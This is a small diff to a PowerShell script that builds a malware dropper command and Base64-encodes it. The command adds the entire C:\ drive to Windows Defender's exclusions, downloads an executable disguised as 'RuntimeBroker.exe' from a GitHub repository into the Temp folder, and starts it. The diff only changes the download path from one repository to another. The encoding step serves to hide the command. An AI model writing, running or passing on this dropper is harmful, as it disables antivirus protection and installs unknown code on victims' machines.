@@ -1,5 +1,4 @@
-$command = 'Add-MpPreference -ExclusionPath C:\; $url="https://github.com/zessu/cybersec/raw/refs/heads/master/RuntimeBroker.exe"; $output="$env:Temp\RuntimeBroker.exe"; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output'
-
+$command = 'Add-MpPreference -ExclusionPath C:\; $url="https://github.com/zessu/test/raw/refs/heads/master/RuntimeBroker.exe"; $output="$env:Temp\RuntimeBroker.exe"; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output'
 # Base64 encode the original command
 $base64Encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
 
